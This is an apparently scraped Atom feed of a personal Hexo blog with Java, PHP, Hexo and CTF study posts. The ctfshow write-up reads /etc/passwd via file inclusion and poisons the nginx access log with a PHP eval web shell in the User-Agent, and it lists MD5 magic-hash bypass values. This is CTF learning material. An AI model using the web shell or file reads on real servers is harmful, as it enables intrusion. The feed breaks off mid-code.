<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kanyun&#39;s Blog</title>
  
  
  <link href="http://kannikanyun.github.io/atom.xml" rel="self"/>
  
  <link href="http://kannikanyun.github.io/"/>
  <updated>2022-04-03T11:16:16.049Z</updated>
  <id>http://kannikanyun.github.io/</id>
  
  <author>
    <name>kanyun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hexo-blog搭建问题汇总</title>
    <link href="http://kannikanyun.github.io/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>http://kannikanyun.github.io/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2022-04-03T11:15:38.000Z</published>
    <updated>2022-04-03T11:16:16.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-hexo-d命令时提示输入账号和密码"><a href="#1-hexo-d命令时提示输入账号和密码" class="headerlink" title="1.hexo d命令时提示输入账号和密码"></a>1.hexo d命令时提示输入账号和密码</h1><p>问题起源来自一次hexo d的命令部署失败（从blog搭建开始那天，只要选择远端部署，报错就没消停过）<br>hexo d后一直报错，提示无法连接github，于是修改了ssh，重新配置了_config.yml中的deploy：repo: <a href="https://github.com/KanNiKanYun/KanNiKanYun.github.io">https://github.com/KanNiKanYun/KanNiKanYun.github.io</a><br>但是依旧没能解决问题：无法部署远端</p><h2 id="于是继续查询解决方案"><a href="#于是继续查询解决方案" class="headerlink" title="于是继续查询解决方案 "></a><strong>于是继续查询解决方案</strong> </h2><p><a href="https://blog.csdn.net/hhgggggg/article/details/77853665">https://blog.csdn.net/hhgggggg/article/details/77853665</a><br>解决参考链接如上<br>关键步骤：<br>配置rope为repo: <a href="mailto:&#x67;&#105;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#109;">&#x67;&#105;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#109;</a>:<strong><u>kannikanyun/kannikanyun</u></strong>.github.io.git</p><h2 id="gitee图床失效后的新的选择方式"><a href="#gitee图床失效后的新的选择方式" class="headerlink" title="gitee图床失效后的新的选择方式"></a>gitee图床失效后的新的选择方式</h2><p><a href="https://blog.csdn.net/rong09_13/article/details/123885104?ops_request_misc=%7B%22request_id%22:%22164897506216780255258485%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164897506216780255258485&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123885104.142%5Ev5%5Epc_search_insert_es_download,157%5Ev4%5Enew_style&utm_term=gitee%E5%9B%BE%E5%BA%8A%E4%B8%8D%E8%83%BD&spm=1018.2226.3001.4187">具体参考配置</a></p><p>概括：使用github仓库作为图床</p><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><p>1.上传速度慢</p><p>2.需要一段时间后更换仓库，以免占用空间过大被检测</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="HEXO" scheme="http://kannikanyun.github.io/tags/HEXO/"/>
    
  </entry>
  
  <entry>
    <title>ctfShow-web-4-6</title>
    <link href="http://kannikanyun.github.io/2022/04/01/ctfShow-web-4-6/"/>
    <id>http://kannikanyun.github.io/2022/04/01/ctfShow-web-4-6/</id>
    <published>2022-04-01T11:17:03.000Z</published>
    <updated>2022-04-03T11:21:27.063Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="4-ctf-show-web4"><a href="#4-ctf-show-web4" class="headerlink" title="4.ctf.show_web4"></a>4.ctf.show_web4</h1><p>题目描述和web3是一样的，但是3的方法已经不行了，没有思路，看提示</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203262104789.png"></p><pre class="line-numbers language-html" data-language="html"><code class="language-html">/etc/passwd依旧可以访问<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">文件包含  日志注入<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><u>请求头中可以看出，服务器是<strong>nginx</strong></u></p><p>nginx的log在</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>access.log允许打开</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">http:&#x2F;&#x2F;6339ac54-c058-4ed2-a21d-5fe884f66c63.challenge.ctf.show&#x2F;?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203272121187.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">在UA中添加<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>防止url编码</p><p>使用蚁剑成功连接</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203272116289.png"></p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203272118949.png"></p><p><a href="%5B(66%E6%9D%A1%E6%B6%88%E6%81%AF">refer to</a> CTF show WEB 1-4_yu22x的博客-CSDN博客_ctfshow web](<a href="https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11">https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11</a>))</p><h1 id="5-ctf-show-web5"><a href="#5-ctf-show-web5" class="headerlink" title="5.ctf.show_web5"></a>5.ctf.show_web5</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"where is flag?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​                </p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031821505.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031822954.png"></p><p><strong>题目的php代码，需要传两个参数v1和v2，v1必须为字母，v2必须为数字，如果两者的MD5值相同，打印flag</strong></p><p>涉及了PHP md5()函数</p><blockquote><p>Php为<strong>弱类型</strong>语言<br>Php中的** == <strong>为</strong>弱类型比较**<br>Md5碰撞利用‘<strong>0e</strong>’开头的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a><br>Php解释器将e解释为 <strong>科学记数法</strong> 分隔<br>因此只要两段明文的md5秘文以0e开头且长度相同</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">常用<span class="token constant">MD5</span>绕过值：字母数字混合类（<span class="token constant">MD5</span>值）：s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span> 大写字母类：<span class="token constant">QLTHNDT</span><span class="token number">0e405967825401955372549139051580</span> <span class="token constant">QNKCDZO</span><span class="token number">0e830400451993494058024219903391</span> <span class="token constant">EEIZDOI</span><span class="token number">0e782601363539291779881938479162</span> 纯数字类：<span class="token number">240610708</span><span class="token number">0e462097431906509019562988736854</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="http://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>java继承与封装学习</title>
    <link href="http://kannikanyun.github.io/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/"/>
    <id>http://kannikanyun.github.io/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-27T03:40:17.000Z</published>
    <updated>2022-03-27T03:40:44.540Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、继承"><a href="#一、继承" class="headerlink" title="一、继承"></a>一、继承</h1><h2 id="抽象类-方法：abstract关键字修饰"><a href="#抽象类-方法：abstract关键字修饰" class="headerlink" title="抽象类/方法：abstract关键字修饰"></a>抽象类/方法：abstract关键字修饰</h2><p><a href="https://blog.csdn.net/weixin_40096176/article/details/79094991?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164835079316782089352133%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164835079316782089352133&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-79094991.142%5Ev5%5Epc_search_result_control_group,143%5Ev6%5Econtrol&utm_term=abstract%E5%85%B3%E9%94%AE%E5%AD%97&spm=1018.2226.3001.4187">java关键字abstract(抽象)详解</a></p><p>简单理解下：abstract关键字修饰的类/方法,只能被 继承、覆写/覆写  后才能实例</p><h2 id="上转型对象"><a href="#上转型对象" class="headerlink" title="上转型对象"></a>上转型对象</h2><p>父类 名称 = new 子类()<br><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203261742422.png"></p><h2 id="equals和-的区别"><a href="#equals和-的区别" class="headerlink" title="equals和==的区别"></a>equals和==的区别</h2><p><strong>双等号比较的其实是地址值</strong></p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203261813387.png"></p><p>在编译String s1=“song”的时候其实是jvm在常量池中创建了一个内容为”song”的地址值,然后让s1去指向”song”,而不是把”song”直接赋值给s1;</p><p>在编译String s2=“song”的时候常量池中已经有了”song”的地址值,所以让s2直接指向常量池中的”song”，这样s1和s2的地址值都是常量池中”song”的地址值,所以通过双等号的运算结果是true。</p><p><strong>equals比较的是内容是否相同</strong></p><p>然而在第二种情况下执行String s2=new String(“song”)的时候,要记住每new一次就会出现一个新的对象,所以这种情况是直接在堆内存中开辟了一块新的空间去储存”song”,所以此时s1和s2的地址值是不一样的,自然==的结果就为false。</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203261825091.png"></p><h1 id="二、private关键字"><a href="#二、private关键字" class="headerlink" title="二、private关键字"></a>二、private关键字</h1><p>父类被子类继承后，其private修饰的属性，只能通过父类的公有方法赋值，也就是说：private修饰属性在构造方法时不必直接赋值，可以在子类继承后通过通过public方法进项赋值</p><h1 id="三、’类’-型的数组"><a href="#三、’类’-型的数组" class="headerlink" title="三、’类’  型的数组"></a>三、’类’  型的数组</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Team</span> <span class="token punctuation">&#123;</span><span class="token comment">// 每次调用表示组队增加一个成员</span> <span class="token class-name">Role</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> mber <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Role</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token class-name">Mber</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//角色上限为6人</span> <span class="token keyword">int</span> sumAttack<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addMember</span><span class="token punctuation">(</span><span class="token class-name">Role</span> role<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Mber</span><span class="token operator">&lt;=</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mber<span class="token punctuation">[</span><span class="token class-name">Mber</span><span class="token punctuation">]</span> <span class="token operator">=</span> role<span class="token punctuation">;</span><span class="token class-name">Mber</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"组队人数超过上限"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">attackSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">Mber</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sumAttack <span class="token operator">+=</span> mber<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> sumAttack<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center>此类数组赋值时，方法中向数组传参的值为父类或子类的实例化对象</center>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="http://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>CtfhubDay1</title>
    <link href="http://kannikanyun.github.io/2022/03/24/CtfhubDay1/"/>
    <id>http://kannikanyun.github.io/2022/03/24/CtfhubDay1/</id>
    <published>2022-03-24T13:52:12.000Z</published>
    <updated>2022-03-26T13:38:46.730Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTF基础知识"><a href="#CTF基础知识" class="headerlink" title="CTF基础知识"></a>CTF基础知识</h1><h2 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h2><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTF比赛一般分为线上赛和线下赛。通常来说，线上赛多为<code>初赛</code>, 线下赛多为<code>决赛</code>, 但是也不排除直接进行</p><h3 id="线上"><a href="#线上" class="headerlink" title="线上"></a>线上</h3><p>选手通过主办方搭建的比赛平台在线注册，在线做题并提交flag，线上比赛多为解题模式，攻防模式较为少见。通常来说对于长时间未解出的题目，主办方会酌情给出提示(<code>Hint</code>)来帮助选手做题。</p><h3 id="线下"><a href="#线下" class="headerlink" title="线下"></a>线下</h3><p>选手前往比赛所在地，现场接入比赛网络进行比赛，线下多为AWD模式，近年来随着比赛赛制的不断革新，线下赛也会出现多种模式混合进行，例如结合<strong>解题+AWD</strong> ，<strong>解题+RW</strong> 等等   </p><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><h2 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h2><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>Re类题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</p><p>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="http://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记2</title>
    <link href="http://kannikanyun.github.io/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <id>http://kannikanyun.github.io/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</id>
    <published>2022-03-23T13:52:23.000Z</published>
    <updated>2022-03-27T14:18:04.436Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第三章-流程控制"><a href="#第三章-流程控制" class="headerlink" title="第三章_ 流程控制"></a>第三章_ 流程控制</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://kannikanyun.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记1</title>
    <link href="http://kannikanyun.github.io/2022/03/17/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://kannikanyun.github.io/2022/03/17/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-03-17T10:29:40.000Z</published>
    <updated>2022-03-23T13:51:21.944Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP第一节简单介绍"><a href="#PHP第一节简单介绍" class="headerlink" title="PHP第一节简单介绍"></a>PHP第一节简单介绍</h1><p>动态页面：网络信息随时间更新</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203092130622.png"></p><p>5.<img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203092141406.png"></p><h3 id="web服务器介绍"><a href="#web服务器介绍" class="headerlink" title="web服务器介绍"></a>web服务器介绍</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203092142534.png"></p><p>1)url地址</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203092145243.png"></p><p>2)dns介绍：</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203092153751.png"></p><h2 id="PHP第二节"><a href="#PHP第二节" class="headerlink" title="PHP第二节"></a>PHP第二节</h2><p>1.localhost、127.0.0.1默认访问的都是站点根目录</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203102032566.png"></p><p>如果没有index.(php)文件，那么就会将文件夹中的文件目录列出来</p><p>apache配置的（www目录为根目录）</p><h2 id="PHP第三节"><a href="#PHP第三节" class="headerlink" title="PHP第三节"></a>PHP第三节</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203142024516.png"></p><p>1.不是PHP文件末尾的’?&gt; ‘不可以省略！！</p><p>2.指令分隔符”;”</p><p>3.解释：</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203142030238.png"></p><p>html文件中不能嵌入php文件，apache服务器默认不会扫描PHP应用服务器（当然可以设置去扫描）</p><p>4.</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203142047245.png"></p><h2 id="PHP第四节"><a href="#PHP第四节" class="headerlink" title="PHP第四节"></a>PHP第四节</h2><h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152150881.png"></p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152155267.png"></p><h3 id="笔记："><a href="#笔记：" class="headerlink" title="笔记："></a>笔记：</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152201299.png"></p><p>2.<img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152202199.png"></p><h3 id="PHP关键字："><a href="#PHP关键字：" class="headerlink" title="PHP关键字："></a>PHP关键字：</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152203289.png"></p><h3 id="变量销毁"><a href="#变量销毁" class="headerlink" title="变量销毁"></a>变量销毁</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152209229.png"></p><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152214157.png"></p><h3 id="变量的引用赋值"><a href="#变量的引用赋值" class="headerlink" title="变量的引用赋值"></a>变量的引用赋值</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152219417.png"></p><blockquote><p>&amp;的解释</p></blockquote><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203152221480.png"></p><h2 id="PHP第五节"><a href="#PHP第五节" class="headerlink" title="PHP第五节"></a>PHP第五节</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203162320165.png"></p><h3 id="变量类型简介"><a href="#变量类型简介" class="headerlink" title="变量类型简介"></a>变量类型简介</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171828767.png" alt="image-20220317182744472"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;true;$b&#x3D;1;echo $a;var_dump($b);&#x2F;&#x2F;同时输出数据类型?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符串类型介绍（单引号与双引号）"><a href="#字符串类型介绍（单引号与双引号）" class="headerlink" title="字符串类型介绍（单引号与双引号）"></a>字符串类型介绍（单引号与双引号）</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171844776.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">999</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'test$abcd'</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string double-quoted-string">"test<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$b</span><span class="token punctuation">&#125;</span></span>asdf"</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token string single-quoted-string">'test&#123;$b&#125;sadf'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 